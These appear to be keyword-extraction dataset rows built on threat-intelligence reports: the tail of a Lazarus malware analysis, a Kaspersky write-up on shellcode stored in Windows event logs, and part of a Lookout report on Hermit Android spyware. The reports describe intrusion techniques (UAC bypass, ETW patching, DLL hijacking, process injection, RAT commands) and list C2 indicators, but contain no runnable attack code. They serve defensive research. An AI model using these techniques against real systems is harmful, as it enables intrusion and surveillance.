3-31 Receive command parsing and executionDifferent operations are presented according to the issued commands. The reverse malicious function.Figure 3-35 Threads that implement malicious functionsSame as the previous two samples, the content in ""error.log"" is still read and then spliced with ""dl.dropboxusercontent.com"", the C2 for subsequent communication is obtained from this address, and the socket connection is attempted.24/33Figure 3‑36 Get C2 from Dropbox and connectIf a socket connection can be established, it will receive commands from the server and implement different malicious functions according to the commands.25/33Figure 3-37 Implementing different malicious functions according to instructionsDifferent operations are presented according to the issued commands. The reverse analysis commands and corresponding functions are roughly as follows.Table 3-9 Commands and corresponding functionsOrder Function0x1According to the received data, change the 8 bytes at offset 0xC of the returned data structure0x2Restart the cmd.exe process or execute the command line through cmd.exe0x4Get a list of disks or get a list of subdirectories and file names in a specified directory0x6Get the specified file0xAGet screenshot information0xBSet a marker to stop taking screenshots0xDSimulate mouse clicks0xESimulate mouse movement0xFModify the parameters of image conversion0x14Change the 8 bytes at offset 0xC of the return data structure to the data stored in the sample0x1Ereturn chrome key0x1F Get the files in the specified directory04 Traceability analysis26/33Through the similarity of pdb paths and the same custom encryption function, it can be inferred that the three PE files involved in the attack should belong to the same attacker. According to the high similarity between the VBA code and the IEUpdate.exe download tool code contained in the template file and the code of the corresponding files in the previous attack activities of the Lazarus organization, it is speculated that this attack activity also belongs to the Lazarus organization.The pdbs of the three files, IEUpdate.exe, hvncengine.dll, and shellengine.dll, are all in the same directory.Figure 4‑1 pdb of IEUpdate.exeFigure 4‑2 pdb of hvncengine.dllFigure 4‑3 pdb of shellengine.dll27/33The custom encryption functions of hvncengine.dll and shellengine.dll are exactly the same, but the keys used are different. The key of IEUpdate.exe and shellengine.dll is ""LNfYIU"", and the key of hvncengine.dll is ""WhdeEg"".Figure 4-4 Custom encryption functionThe template files with malicious macros and the IEUpdate.exe download tool are mostly similar to the sample code previously discovered by the Lazarus group.Figure 4‑5 vba code involved in this attackFigure 4‑6 VBA code [2]28/33Figure 4‑7 The download tool code involved in this attack29/33Figure 4‑8 Download tool code involved in previous attacks[2]0 5 Threat Framework Mapping The ATT&CK framework map of the behavioral technical points of the Lazarus organization-related attack activities is as follows:30/33Figure 5-1 Lazarus organization's attack activity corresponding to the ATT&CK threat framework mapThis series of activities involves a total of 28 technical points in 11 stages in the ATT&CK framework. The specific behaviors are described in the following table:Table 5-1 ATT&CK technical behavior description tableATT&CK Stage/Categoryspecific behaviorNotesresource developmentget infrastructureUse DropBox to store the C2 address of subsequent connectionsinitial visitPhishingSpeculation may use phishing emails to spread decoy filesinitial visitwatering hole attackSpeculation that decoy files may be spread through watering hole attacksimplementimplementUse inter-process communicationThe shellengine.dll backdoor can execute cmd commands through pipesinduce users to executeInduce users to open a decoy document constructed by the attackerPersistenceBootstrap or login with autostartPersistence by modifying registry startup keysescalation of rightsAbuse of Elevated Control PrivilegesBypassing UAC via fodhelper.exeescalation of rightsprocess injectionInject IEUpdate.exe into the WINWORD.exe processdefensive evasiondefensive evasionAbuse of Elevated Control PrivilegesBypassing UAC via fodhelper.exeDeobfuscate/decode files or messagesThe key string of the sample species is encrypted by a custom algorithm31/33defensive mechanismsprocess injectionModify Windows Defender's whitelistInject IEUpdate.exe into the WINWORD.exe processtemplate injectionUsing template injection to load remote malicious template executionVirtualization/Sandbox EscapeAvoid some sandboxes by judging whether the sleep delay is successfulSteal web session cookiessteal chrome cookiesDiscover the application windowDiscover application windows for remote desktop controlDiscover files and directoriesDiscover files and directories in the target machinediscovery processDiscover process information in the target machineQuery the registrytarget machine foundDiscover system informationDiscover the system version and other information of the target machineDiscover system owner/userfind system timeFind the current user of the target machineFind the current system time of the target machineVirtualization/Sandbox EscapeAvoid some sandboxes by judging whether the sleep delay is successfulcollectCollect local system dataCollect data such as system version, username, file list, files, etc.collectinput captureCapture mouse and keyboard messages32/33collecttake screenshottake screenshotcommand and controlUse application layer protocolsUse socket to communicate with C2data exfiltrationBackhaul using C2 channelThe data is also sent back through the C2 The Lazarus group is the top hacker gang in the peninsula region, focusing on long-term and persistent cyberattacks against specific targets, with the purpose of stealing funds and achieving political goals. It is one of the biggest threats to global financial institutions. In this attack, the Lazarus group used a multi-stage download tool and obtained the C2 address through Dropbox, which made it more difficult to obtain the attack payload. At the same time, there were behaviors of detecting the designated anti-software components and sandboxes in the sample, which interfered with the analysis. The sample also uses fodhelper.exe to bypass UAC to escalate the privileges of malicious processes, making the attack more difficult to detect by means of process injection and changing the exclusion list of Windows Defender. The anti-virus software ALyac and Ahnlab detected in the sample are both popular anti-virus software in South Korea. Combined with the name of the decoy file ""Sogang KLEC.docx"" and the pictures in the text of the decoy document, it can be inferred that this is an attack against South Korea.References:[1] 한국인터넷정보센터 (KRNIC)를사칭한정보수집악성이메일주의!! (변종내용추가) url Snow and gluttony: Analysis of suspected Lazarus attacks against Korean companies url companies/33/33 ","{'phrases': ['PE', 'phishing emails', 'macro', 'IEUpdate.exe', 'C2', 'DropBox', 'addition', 'hvncengine.dll', 'shellengine.dll', 'execution', 'data exfiltration', 'process injection', 'detection', 'document'], 'target': 'PE; phishing emails; macro; IEUpdate.exe; C2; DropBox; addition; hvncengine.dll; shellengine.dll; execution; data exfiltration; process injection; detection; document.'}"
The attacker; initial infection; September 2021; the Cobalt Strike module; Install; the victim; the link; a.rar; the target; the link; the.rar file; the malware; load; the victim; the dropper modules; custom anti-detection wrappers; the final stage; the Trojan; a blob; AES256; CBC; the blob; the system; C2; an integer; the shellcode; data; the end; a RAT; memory; the C2 web address; Windows; modules; time; custom anti-detection wrappers; system information; the C2; functions; RAT; detection; the campaign.,"['1. Send spearphishing document exploiting a vulnerability to drop initial malware. 2. First stage malware resolves APIs, checks process name, and drops signed Symantec binary and launcher DLL. 3. Launcher DLL loads and patches Windows APIs to disable event logging. 4. Dropper writes encrypted shellcode for next stage in Windows event logs. 5. Launcher gathers shellcode from event logs and injects next stage malware into dllhost process. 6. Next stage malware connects to C2 servers for commands. 7. Additional tools like Cobalt Strike and SilentBreak used for reconnaissance and lateral movement. 8. Final RAT payload deployed, often using process injection to avoid detection. 9. RAT exfiltrates data and can download more malware. 10. Infrastructure utilizes VPS services to host C2 and malware. ']","Extract the keywords: securelist.com /a-new-secret-stash-for-fileless-malware/106393/ A new secret stash for “fileless” malwareDenis LegezoIn February 2022 we observed the technique of putting the shellcode into Windows event logs for the first time “in the wild” during the malicious campaign. It allows the “fileless” last stage Trojan to be hidden from plain sight in the file system. Such attention to the event logs in the campaign isn’t limited to storing shellcodes. Dropper modules also patch Windows native API functions, related to event tracing (ETW) and anti-malware scan interface (AMSI), to make the infection process stealthier.Besides event logs there are numerous other techniques in the actor’s toolset. Among them let us distinguish how the actor takes initial recon into consideration while developing the next malicious stages: the C2 web domain name mimicking the legitimate one and the name in use belonging to the existing and software used by the victim. For hosting the attacker uses virtual private servers on Linode, Namecheap, DreamVPS.One more visible common approach is the use of a lot of anti-detection decryptors. Actor uses different compilers, from Microsoft’s cl.exe or GCC under MinGW to a recent version of Go. Also, to avoid detection, some modules are signed with a digital certificate. We believe it is issued by the actor, because our telemetry doesn’t show any legitimate software signed with it, only malicious code used in this campaign.Regarding last stage Trojans: the actor decided not to stick to just one – there are HTTP and named pipe based ones. Obviously besides the event logs the actor is obsessed with memory injection – lots of RAT commands are related to it and are used heavily. Along with the aforementioned custom modules and techniques, several commercial pentesting tools like Cobalt Strike and SilentBreak’s toolset are used.1/11Actually, as we don’t have commercial versions of the latter it’s hard to say which enumerated techniques came from the product and which are home-brewed. For sure, third-party code from GitHub is also in use: we registered at least BlackBone for legitimate processes in memory patching. The infection chainWe started the research from the in-memory last stager and then, using our telemetry, were able to reconstruct several infection chains. What piqued our attention was the very targeted nature of the campaign and the vast set of tools in use, including commercial ones.The variety of the campaign’s techniques and modules looks impressive. Let us divide it into classes to technically describe this campaign. Actually, we need to cover the following sets of modules: commercial pentesting suites, custom anti-detection wrappers around them and last stage Trojans.Commercial tool setsAnti-detection wrappersLast stage RATSilentBreaks’s toolset Cobalt Strike Go decryptor with heavy usage of the syscall library. Keeps Cobalt Strike module encoded several times, and AES256 CBC encrypted blob. We haven’t previously observed Go usage with Cobalt Strike A library launcher, compiled with GCC under MinGW environment. The only possible reason for this stage is anti-detection AES decryptor, compiled with Visual Studio compiler HTTP-based Trojan. Possible original names are ThrowbackDLL.dll and drxDLL.dll, but code is more complex than old publicly available version of SilentBreak’s Throwback Named pipes-based Trojan. Possible original names are monolithDLL.dll and SlingshotDLL.dll. Based on file names there is a possibility that last stage modules are parts of a commercial Slingshot versionOnce again, some modules which we consider custom, such as wrappers and last stagers, could possibly be parts of commercial products. So now after some classification we are ready to analyze modules one by one. Initial infectionThe earliest phase of attack we observed took place in September 2021. The spreading of the Cobalt Strike module was achieved by persuading the target to download the link to the .rar on the legitimate site file.io, and run it themselves. The digital certificate for the Cobalt Strike module inside is below (during the campaign with the same one, 15 different stagers from wrappers to last stagers were signed):1Organization: Fast Invest ApS2E-mail: sencan.a@yahoo.com3Thumbprint 99 77 16 6f 0a 94 b6 55 ef df 21 05 2c 2b 27 9a 0b 33 52 c44Serial 34 d8 cd 9d 55 9e 81 b5 f3 8d 21 d6 58 c4 7d 72Due to the different infection scenarios for all the targeted hosts we will describe just one of the observed ones. Having an ability to inject code into any process using Trojans, the attackers are free to use this2/11feature widely to inject the next modules into Windows system processes or trusted applications such as DLP.Keeping in mind truncated process injections, and even mimicking web domain registration, we could describe the attack process as quite iterative: initial recon with some modules and then preparation of additional attacks. Commercial tool setsRegarding the commercial tools, traces of SilentBreak and Cobalt Strike toolset usage in this campaign are quite visible. Trojans named ThrowbackDLL.dll and SlingshotDLL.dll remind us of Throwback and Slingshot, which are both tools in SilentBreak’s framework, while the “sb” associated with the dropper (sb.dll) could be an abbreviation of the vendor’s name.Here we want to mention that several .pdb paths inside binaries contain the project’s directory C:\Users\admin\source\repos\drx\ and other modules not named after Throwback or Slingshot, such as drxDLL.dll. However, encryption functions are the same as in the publicly available Throwback code. Anti-detection wrappersFor the anti-detection wrappers, different compilers are in use. Besides MSVC, Go compiler 1.17.2 and GCC under MinGW have been used. Decryptors differ a lot; the features they contain are listed in the table below:Anti-detection technique Several compilersWhitelisted launchersDigital certificatePatch logging exports of ntdll.dllKeep shellcode in event logsC2 web domain mimickingUsage The same AES256 CBC decryption could be done with Go and C++ modules Autorunned copy of WerFault.exe maps the launcher into process address space 15 files are signed with “Fast Invest” certificate. We didn’t observe any legitimate files signed with it To be more stealthy, Go droppers patch logging-related API functions like EtwEventWriteFull in self-address space with empty functionality This is the main innovation we observed in this campaign. Encrypted shellcode with the next stager is divided into 8 KB blocks and saved in the binary part of event logs Actor registered a web domain name with ERP in use titleThis layer of infection chain decrypts, maps into memory and launches the code. Not all of them are worth describing in detail, but we will cover the Go decryptor launcher for Cobalt Strike. All corresponding hashes are listed in the appendix.Function names in the main package are obfuscated. Main.init decodes Windows API function names from kernel32.dll and ntdll.dll libraries (WriteProcessMemory and other functions) related to event log creation. Each of these names in the binary are base64-encoded four times in a row. Using WriteProcessMemory, the dropper patches with “xor rax, rax; ret” code the following functions in memory: EtwNotificationRegister, EtwEventRegister, EtwEventWriteFull, EtwEventWriteFull, EtwEventWrite.3/11In Main.start the malware checks if the host is in the domain and only works if it’s true. Then it dynamically resolves the addresses of the aforementioned functions. The next stager is encrypted with AES256 (CBC mode), the key and IV are encoded with base64.With such an approach, it requires the researcher to code some script to gather the encrypted parts of the next module. After decryption, to get the final portable executable, data has to be converted further. Last stager typesLast stagers have two communication mechanisms – over HTTP with RC4 encryption and unencrypted with named pipes. The latter way is technically able to communicate with any network visible external host, but under Windows named pipes are built upon the SMB protocol, which would barely open for external networks. So these modules most probably serve for lateral movement.Named pipes-based trojanFeature Self version in beacon Natural language artifacts Quite unusual among the commandsHTTP-based trojan Active connection to a randomly chosen C2 from a hardcoded list Passive mode XOR-based, RC4 1.1 Unused argument “dave” Quite basic, 7 of them Yes and much in use Sleep time randomization: (random between 0,9 – 1,1) * More profound, 20 of them Yes and much in useGet minutes since last user inputAfter this introduction into the set of malware, we will now describe the infection chain: dropper injection with Cobalt Strike pentesting suite. Dropper in DLL, search order hijackingWe start custom module analysis from the wrapper-dropper dynamic library. This code is injected into Windows processes such as explorer.exe. At its single entry point after being loaded into the virtual address space of the launcher process, the dropper removes files created by previous stages or executions.Firstly, the module copies the original legitimate OS error handler WerFault.exe to C:\Windows\Tasks. Then it drops one of the encrypted binary resources to the wer.dll file in the same directory for typical DLL search order hijacking. For the sake of persistence, the module sets the newly created WerFault.exe to autorun, creating a Windows Problem Reporting value in the Software\Microsoft\Windows\CurrentVersion\Run Windows system registry branch.4/11The dropper not only puts the launcher on disk for side-loading, but also writes information messages with shellcode into existing Windows KMS event logThe dropped wer.dll is a loader and wouldn’t do any harm without the shellcode hidden in Windows event logs. The dropper searches the event logs for records with category 0x4142 (“AB” in ASCII) and having the Key Management Service as a source. If none is found, the 8KB chunks of shellcode are written into the information logging messages via the ReportEvent() Windows API function (lpRawData parameter). Created event IDs are automatically incremented, starting from 1423. Launcher in wer.dllThis launcher, dropped into the Tasks directory by the first stager, proxies all calls to wer.dll and its exports to the original legitimate library. At the entry point, a separate thread combines all the aforementioned 8KB pieces into a complete shellcode and runs it. The same virtual address space, created by a copy of the legitimate WerFault.exe, is used for all this code.To prevent WerFault continuing its error handling process, the DLL patches the launcher’s entry point with typical Blackbone trampolinesThe way to stop the legitimate launcher’s execution isn’t traditional. In the main thread, wer.dll finds its entry point and patches it with a simple function. WaitAndExit() on the screenshot above would just call WaitForSingleObject() with the log gathering thread id and then exit, meaning no real WerFault.exe error handling code could ever be executed: the spoofed DLL mapped into its address space would block it. Shellcode into Windows event logsThe launcher transmits control to the very first byte of the gathered shellcode. Here, three arguments for the next function are prepared:Address of next stage Trojan. It is also contained within the data extracted from the event logs The standard ROR13 hash of exported function name Load inside this Trojan (0xE124D840) Addresses of the string “dave” and constant “4”, which become the arguments of the exported function, found by hash5/11The parsing of the next Windows portable executable to locate its entry point is quite typical. To make the next stage Trojan less visible, the actor wiped the “MZ” magic in its header. After calling the code at the Trojan’s entry point, the shellcode also searches for the requested export and invokes it.Besides searching for the entry point and calling it, the shellcode also searches for a Trojan export by hardcoded hash and runs the found function with arguments “dave” and “4” HTTP TrojanFor last stagers we will be a bit more detailed than for auxiliary modules before. The C++ module obviously used the code from SilentBreak’s (now NetSPI’s) Throwback public repository: XOR-based encryption function, original file name for some samples, e.g., ThrowbackDLL.dll, etc. Let us start here with the aforementioned Load() exported function. It’s just like the patching of WerFault above (the function waits on the main Trojan thread) but it ignores any parameters, so “dave” and “4” are unused. It is possible this launcher supports more modules than just this one, which would require parameters.Target fingerprintingThe module decrypts C2 domains with a one- byte XOR key. In the case of this sample there is only one domain, eleed[.]online. The Trojan is able to handle many of them, separated by the “|” character and encrypted. For further communications over plain HTTP, the Trojan chooses a random C2 from this set with user agent “Mozilla 5.0”.The malware generates a fingerprinting string by gathering the following information, also separated by “|’:Values of MachineGUID from the SOFTWARE\Microsoft\Cryptography6/11Computer name Local IP addresses obtained with GetAdaptersInfo Architecture (x86 or x64) OS version Whether the current process has SeDebugPrivilegeThe fingerprinter also appends “1.1” to the string (which could be the malware version) and the sleep time from the current config.Encrypted HTTP communication with C2Before HTTP communications, the module sends empty (but still encrypted) data in an ICMP packet to check connection, using a hardcoded 32-byte long RC4 key. Like any other strings, this key is encrypted with the Throwback XOR-based algorithm.If the ping of a control server with port 80 available is successful, the aforementioned fingerprint data is sent to it. In reply, the C2 shares the encrypted command for the Trojan’s main loop.Trojan commandsCode Fingerprint the target again. Execute command. The Trojan executes the received command in the new process and sends the result back to the C2. Download from a URL and save to the given path. Set a new sleep time. This time in minutes is used as a timeout if the C2 hasn’t replied with a command to execute yet. Formula for randomization is (random number between 0,9 – 1,1) * sleep time. Sleep the given number of minutes without changing the configuration. List processes with PID, path, owner, name and parent data. Inject and run shellcode into the target process’ address space. To inject into the same process, the command argument should be “local”. Like the shellcode in the event logs, this one would run the provided PE’s entry point and as well as a specific export found by hash. Terminates the session between trojan and C2.Another Trojan in use during this campaign is named pipe-based and has a more profound command system, including privilege escalation, screenshotting, inactivity time measurement, etc. Here, we come to the infection chain end. We continue with another last stage Trojan type, which we observed injected into processes like edge.exe. Named pipes-based TrojanThe Trojan location is C:\Windows\apds.dll. The original legitimate Microsoft Help Data Services Module library with the same name is in C:\Windows\System32. The main Trojan working cycle is in a separate thread. The malware also exports a Load() function, whose only purpose is to wait for a working thread, which is typical for this campaign’s modules.7/11First, the main trojan thread gets the original apds.dll and exports and saves it into an allocated new heap buffer right after the Trojan’s image in memory. Then the Trojan edits the self-exported functions data in a way that allows it to call the original apds.dll exports through the crafted stubs like the following, where the address is the one parsed from the real apds.dll:148B8<addr> MOV RAX,<addr>2FFE0 JMP RAXThis trampoline code is taken from the Blackbone Windows memory hacking library (RemoteMemory::BuildTrampoline function). DLL hijacking isn’t something new, we have seen such a technique used to proxy legitimate functions many times, but recreating self-exports with just short stubs to call the original legitimate functions is unusual. The module then creates a duplex-named pipe, “MonolithPipe”, and enters its main loop.Work cycleAfter the aforementioned manipulations with exported functions, the module lightly fingerprints the host with architecture and Windows version information. The Trojan also initializes a random 11-byte ASCII string using the rare constant mentioned, e.g., here in the init_keys function. The result serves as a unique session id.The malware connects to the hardcoded domain on port 443 (in this case url and sends POST requests to submit.php on the C2 side. HTTPS connection options are set to accept self- signed certificates on the server side. The C2 communication in this case is encrypted with an RC4 algorithm with the Dhga(81K1!392-!(43<KakjaiPA8$#ja key. In the case of the named pipes- based Trojan, the common commands are:Code Set the “continue” flag to False and stop working. N/A, reserved so far. Get time since the last user input in minutes. Get current process information: PID, architecture, user, path, etc. Get host domain and user account. Impersonate user with credentials provided. Get current process’s available privileges. Execute command with the cmd.exe interpreter. Test connection with a given host (address and port) using a raw TCP socket. Get running processes information: path, owner, name, parent, PID, etc. Impersonate user with the token of the process with a provided ID. List files in directory. Take a screenshot. Drop content to file. Read content from file Delete file. Inject provided code into process with the given name. Run shellcode from the C2. N/A, reserved so far.8/1119Run PowerShell script. During this campaign we observed Invoke-ReflectivePEInjection to reflectively load Mimikatz in memory and harvest credentials.We have now covered the three layers of the campaign. Interestingly, we observed a Trojan with a complete command set as in the table above, but still using RC4-encrypted HTTP communications with the C2 instead of named pipes. The last stage samples look like a modular platform, whose capabilities the actor is able to combine according to their current needs. InfrastructureIP 178.79.176[.]136 178.79.176[.]136Domain timestechnologies[.]org 93.95.228[.]97 avstats[.]net 93.95.228[.]97 mannlib[.]com 162.0.224[.]144 nagios.dreamvps[.]com 185.145.253[.]62 opswat[.]info 194.195.241[.]46 – 178.79.176[.]1 AttributionFirst seen Jan 15, 2022 – Jan 17, 2022 Jan 17, 2022 Aug 20, 2021 Jan 17, 2022 Jan 11, 2022 44925 – The 1984 44925 – The 1984 63949 – LinodeThe code, which we consider custom (Trojans, wrappers), has no similarities with previously known campaigns or previously registered SilentBreak toolset modules. Right now we prefer not to name the activity and instead stick to just “SilentBreak” given it is the most used among the tools here. If new modules appear and allow us to connect the activity to some actor we will update the name accordingly. ConclusionsWe consider the event logs technique, which we haven’t seen before, the most innovative part of this campaign. With at least two commercial products in use, plus several types of last-stage RAT and anti- detection wrappers, the actor behind this campaign is quite capable. There is the possibility that some of the modules we described here as custom ones are part of a commercial toolset as well. The code is quite unique, with no similarities to known malware. We will continue to monitor similar activity.In the Targeted Malware Reverse Engineering training course, Kaspersky experts share its best and most valuable practices to build a safer world. Learn more about targeted malware with Denis Legezo and other GReAT experts at: url Indicators of Compromise File Hashes (malicious documents, trojans, emails, decoys)Dropper FA5943C673398D834FB328CE9B62AAADLogs code launcher 13B5E1654869985F2207D846E4C0DBFDNamed pipes trojan and similar 603413FC026E4713E7D3EEDAB0DF5D8DAnti-detection wrappers/decryptors/launchers, not malicious by themselves F3DA1E157E3E344788886B3CA29E02BDHost-based IoCsC:\Windows\Tasks\wer.dll C:\Windows\Tasks\WerFault.exe copy of the legit one to sideload the malicious .dll Named pipe MonolithPipe Event logs with category 0x4142 in Key Management Service source. Events ID auto increments starting from 1423.PDB paths10/11C:\Users\admin\source\repos\drx\x64\Release\sb.pdb C:\Users\admin\source\repos\drx\x64\Release\zOS.pdb C:\Users\admin\source\repos\drx\x64\Release\ThrowbackDLL.pdb C:\Users\admin\source\repos\drx\x64\Release\drxDLL.pdb C:\Users\admin\source\repos\drx\x64\Release\monolithDLL.pdb11/11 ","{'phrases': ['AB', 'malware', 'first', 'name', 'drops', 'launcher', 'DLL', 'Dropper', 'encrypted shellcode', 'next stage', 'Windows event', 'event logs', 'C2', 'commands', 'tools', 'Cobalt Strike', 'SilentBreak', 'use', 'lateral movement', 'RAT', 'process injection', 'detection', 'data', 'Download', '10', 'Infrastructure'], 'target': 'AB; malware; first; name; drops; launcher; DLL; Dropper; encrypted shellcode; next stage; Windows event; event logs; C2; commands; tools; Cobalt Strike; SilentBreak; use; lateral movement; RAT; process injection; detection; data; Download; 10; Infrastructure.'}"
Hermit; Android; a telecommunications company; a website; the malware; SMS messages; users; the spyware; the legitimate websites; companies; Android; devices; China; Samsung; Vivo; Hermit; users; their location; IP address; the C2 server; code; arbitrary commands; the C2 server; the device; data; call logs; contacts; location; IP; SMS messages; Operators; access.,"[""1. Hermit is distributed via SMS messages impersonating legitimate companies. 2. Users install what they believe is an app from a trusted source. 3. Hermit displays a real company's website and decrypts its configuration. 4. It performs checks to avoid detection and analysis. 5. Hermit contacts its C2 server to download modules with surveillance capabilities. 6. It exploits the device for root access if possible to enable more data collection. 7. Modules exfiltrate data like contacts, audio recordings, notifications, etc. back to the C2. 8. Additional modules can be downloaded as needed for further surveillance. ""]","Extract the keywords: www.lookout.com /blog/hermit-spyware-discovery Lookout Uncovers Android Spyware Deployed in KazakhstanLookout Threat Lab researchers have uncovered enterprise-grade Android surveillanceware used by the government of Kazakhstan within its borders. While we’ve been following this threat for a while using Lookout Endpoint Detection and Response (EDR) these latest samples were detected in April 2022, four months after nation-wide protests against government policies were violently suppressed.Based on our analysis, the spyware, which we named “Hermit,” is likely developed by Italian spyware vendor RCS Lab S.p.A and Tykelab Srl, a telecommunications solutions company we suspect to be operating as a front company.This isn't the first time Hermit has been deployed. We know that the Italian authorities used it in an anti-corruption operation in 2019. We also found evidence suggesting that an unknown actor used it in northeastern Syria, a predominantly Kurdish region that has been the setting of numerous regional conflicts.While some Hermit samples have been detected before and are broadly recognized as generic spyware, the connections we make in this blog to developers, campaigns and operators are new.RCS Lab, a known developer that has been active for over three decades, operates in the same market as Pegasus developer NSO Group Technologies and Gamma Group, which created FinFisher. Collectively branded as “lawful intercept” companies, they claim to only sell to customers with legitimate use for surveillanceware, such as intelligence and law enforcement agencies. In reality, such tools have often been abused under the guise of national security to spy on business executives, human rights activists, journalists, academics and government officials. What is Hermit?Named after a distinct server path used by the attacker’s command and control (C2), Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it’s deployed.We obtained and analyzed 16 of the 25 known modules, each with unique capabilities. These modules, along with the permissions the core apps have, enable Hermit to exploit a rooted device, record audio and make and redirect phone calls, as well as collect data such as call logs, contacts, photos, device location and SMS messages.We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source. The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers. Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background.We’re aware of an iOS version of Hermit but were unable to obtain a sample for analysis. Kazakhstan deploymentOur analysis suggests that Hermit has not only been deployed to Kazakhstan, but that an entity of the national government is likely behind the campaign. To our knowledge, this marks the first time that a current customer of RCS Lab’s mobile malware has been identified.1/17We first detected samples from this campaign in April 2022. They were titled “oppo.service” and impersonated Chinese electronic manufacturer Oppo. The website the malware used to mask its malicious activity is an official Oppo support page (url in the Kazakh language that has since gone offline. We also found samples that impersonate Samsung and Vivo.The now defunct Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background.The samples used in the Kazakh targeted campaign connected to the C2 address at 45.148.30[.]122:58442. However, further analysis of the spyware’s C2 server revealed that this IP address is used as a proxy for the real C2 server at 85.159.27[.]61:8442. The real C2 IP address is administered by STS Telecom, a small internet service provider (ISP) operating out of Nur-Sultan, Kazakhstan’s capital. Based on sparse online records, STS specializes in “other wired telecommunications” and cable services.2/17Our interaction with a poorly configured C2 server revealed the true C2 IP address.Syria, Italy and other targetsPrior to detecting the Kazakhstan samples, we found a reference to “Rojava,” a Kurdish-speaking region in northeastern Syria, in the passive DNS records of Hermit. This is significant because the region has been the site of ongoing crises, such as the Syrian civil war and conflicts between the Islamic State (IS) and U.S.-led coalition support of the Kurdish-led Syrian Democratic Forces (SDF). Most recently, Turkey conducted a series of military operations against the SDF that resulted in partial occupation of the region.The domain we found (rojavanetwork[.]info) specifically imitates “Rojava Network,” a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region, often in support of SDF operations.3/17The domain rojavanetwork[.]info seems to be specifically imitating “Rojava Network,” a social media brand on Facebook and Twitter tha analysis of the region, often in support of SDF operations.Outside Syria, Hermit has been deployed in Italy. According to a document released by the Italian lower house in 2021, Italian authorities potentially misused it in an anti-corruption operation. The document mentioned an iOS version of Hermit and linked RCS Lab and Tykelab to the malware, which corroborates our analysis. RCS Lab and its controversial connectionsLike many spyware vendors, not much is known about RCS Lab and its clientele. But based on the information we do have, it has a considerable international presence.According to leaked documents published in WikiLeaks in 2015, RCS Lab was a reseller for another Italian spyware vendor HackingTeam, now known as Memento Labs, as early as 2012. Correspondences between the two companies revealed that RCS Lab engaged with military and intelligence agencies in Pakistan, Chile, Mongolia, Bangladesh, Vietnam, Myanmar and Turkmenistan — the latter three ranked as authoritarian regimes by the Democracy Index.RCS Lab also has past dealings with Syria, another authoritarian regime, as part of its collaboration with Berlin-based Advanced German Technology (AGT) to sell surveillance solutions.4/17Countries that had ties to RCS Lab’s past business connections. Top row: Chile, Pakistan, Mongolia and Bangladesh; bottom row: MyaTykelab and its connection to RCS LabAccording to its own website, Tykelab provides innocuous technology solutions. However, we found various publicly- available clues that suggest otherwise. In addition to the Italian parliamentary document, we found several pieces of evidence tying Tykelab to RCS Lab.For example, a current Tykelab employee’s LinkedIn profile indicates that they also work at RCS Lab. In addition, the company offers services that require skills that may be useful in the development and delivery of surveillanceware, such as knowledge or interaction with telecommunications networks, social media analysis, SMS services and mobile app development. One of the Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices.5/17This Tykelab job listing highlights interest in mobile network vulnerabilities, penetration testing, and reverse engineering: skills that canIn our own analysis of Hermit, we were able to tie Tykelab to Hermit and RCS Lab. One of the IP addresses Hermit used for C2 communications revealed an SSL certificate shared with another IP, 93.51.226[.]53. Notably, the shared certificate has Milan, Italy in the locality field which is where RCS Lab is headquartered.This second IP used another SSL certificate that directly named RCS as the organization and Tykelab as the organization unit. The location references Rome, which is the headquarters location of Tykelab6/17An SSL certificate tied to Hermit infrastructure shows that Tykelab and RCS Lab are both connected to the spyware.Technical analysis: Hermit’s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise-grade capabilities to collect and transmit data.For example, it uses 20-plus parameters, which enables any operator to tailor it to their campaign. The spyware also attempts to maintain data integrity of collected ‘evidence’ by sending a hash-based message authentication code (HMAC). This allows the actors to authenticate who sent the data as well as ensure the data is unchanged. Using this method for data transmission may enable the admissibility of collected evidence.To cover up its true intentions, Hermit is built to be modular. This means malicious functionality is hidden inside additional payloads that the malware downloads as needed.How it tricks victims and avoids detectionAs we mentioned earlier, Hermit pretends to come from legitimate entities, namely telecommunications companies or smartphone manufacturers. To keep up this facade, the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background.The first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server. But before communication happens, Hermit performs a series of checks to ensure that it isn’t being analyzed. This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier.Modules and data collectionOnce the malware connects with the C2, it takes instructions on what modules to download, each with distinct capabilities. In addition to the modules, the permissions that the malware requests indicate the various ways it could collect data.Hermit can be asked by the C2 to download modules from any URL and then load them dynamically.In total we acquired 16 modules by interacting with the IP address (45.148.30[.]122:58442) “oppo.service” used for C2 communications. Based on identification numbers assigned to the modules in Hermit’s code, there are at least 25 modules.7/17Within the core app, we found an abstract class called “module” that provided additional hints as to what the rest of the modules are capable of. The code contained references to exploit usage, which was further confirmed by clues found in obtained modules. While we weren’t served exploits during testing, we can tell that an exploited device will modules that can use exploits.If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service. This service will then be used to enable elevated device privileges such as access to accessibility services, notification content, package use state and the ability to ignore battery optimization.Beyond the root service, some of the modules expect or attempt to use root access directly through a su binary. These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction.While this may be a generic attempt at using root without user awareness, SuperSU may also be a part of the unknown exploitation process. If root is not available, the modules may prompt the user to take actions which will accomplish the same goals.These are the modules we were able to acquire (refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book TelegramLike other weaponry, spyware can easily be abusedVendors of so-called “lawful intercept” spyware, such as RCS Lab, the NSO Group and Gamma Group, usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism. However, there have been many reports, especially in recent years, of spyware being misused.We found evidence of Hermit being deployed in Kazakhstan and Syria, countries with poor human rights records. Even in the case of the anti-corruption operations in Italy, there was alleged mishandling of personal and private data.In a sense, electronic surveillance tools are not that different from any other type of weaponry. Just this month, faced with financial pressure, CEO of the NSO group Shalev Hulio opened up the possibility of selling to “risky” clients. Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear-cut as they project.How to protect yourself from spyware like HermitWith sophisticated data 